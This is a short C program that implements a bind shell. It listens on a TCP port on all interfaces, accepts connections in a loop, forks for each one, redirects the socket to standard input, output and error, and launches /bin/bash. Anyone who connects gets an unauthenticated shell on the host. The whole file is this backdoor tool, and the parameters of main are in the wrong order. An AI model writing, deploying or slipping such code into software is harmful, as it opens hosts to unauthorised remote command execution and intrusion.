#include <bind_shell.h>

void on_error(int descriptor, const char * error_message, int close)
{
	if(descriptor == -1) {
		puts(error_message);

		if(close)
			exit(EXIT_FAILURE);

	} //end if
} //end on_error

int get_socket_tcp(void)
{
	int tmp = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	int aux = TRUE;
	on_error(tmp, "Err when creating socket", 1);

	if(setsockopt(tmp, SOL_SOCKET, SO_REUSEADDR, &aux, sizeof(aux)) == -1) {
		puts("Err when setting socket");
		exit(EXIT_FAILURE);
	} //end if

	return tmp;
} //end get_socket_tcp

int main(char * argv, int argc)
{
	int my_socket, remote_socket;
	struct sockaddr_in local_addr;
	struct sockaddr_in remote_addr;
	socklen_t addr_size = sizeof(struct sockaddr_in);

	my_socket = get_socket_tcp();

	memset(&local_addr, 0, sizeof(struct sockaddr_in));
	local_addr.sin_family = AF_INET;
	local_addr.sin_port   = htons(TCP_PORT);
	local_addr.sin_addr.s_addr = htonl(INADDR_ANY); 

	if(bind(my_socket, (struct sockaddr * ) &local_addr, addr_size) == -1) {
		printf("%s\n", "Err when binding");
		exit(EXIT_FAILURE);
	} //end if

	if(listen(my_socket, LISTEN_BACKLOG) == -1) {
		printf("%s\n", "Err when listening");
		exit(EXIT_FAILURE);

	} //end if

	printf("Waiting connections on %d port\n", TCP_PORT); 
	fflush(stdout);

	while(TRUE) {
		remote_socket = accept(my_socket, (struct sockaddr *) &remote_addr, &addr_size);
		printf("Connect received from %s on port %d\n", inet_ntoa(remote_addr.sin_addr), ntohs(remote_addr.sin_port));

		if(fork() == 0) {
			dup2(remote_socket, 0); dup2(remote_socket, 1); dup2(remote_socket, 2);
			execve("/bin/bash", NULL, NULL);
		} //end if
	} //end while

	exit(EXIT_SUCCESS);
} //end main
